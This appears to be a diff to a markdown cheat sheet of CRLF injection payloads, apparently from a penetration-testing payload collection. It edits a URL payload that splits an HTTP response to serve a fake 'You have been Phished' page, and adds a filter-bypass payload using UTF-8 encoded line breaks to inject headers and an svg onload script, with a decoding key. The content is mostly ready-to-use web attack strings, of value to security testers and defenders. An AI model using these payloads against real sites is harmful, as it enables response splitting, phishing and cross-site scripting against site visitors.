@@ -26,7 +26,7 @@ x-xss-protection: 1; mode=block
 ## CRLF - Write HTML
 Requested page
 ```
-http://www.example.net/index.php?lang=en%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
+http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
 ```
 
 HTTP response
@@ -40,6 +40,21 @@ Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
 Content-Length: 34
  
 <html>You have been Phished</html>```
+
+
+## CRLF - Filter Bypass
+Using UTF-8 encoding
+```
+%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
+```
+Remainder:
+* %E5%98%8A = %0A = \u560a
+* %E5%98%8D = %0D = \u560d
+* %E5%98%BE = %3E = \u563e (>)
+* %E5%98%BC = %3C = \u563c (<)
+
+
+
 
 ## Thanks to
 * https://www.owasp.org/index.php/CRLF_Injection
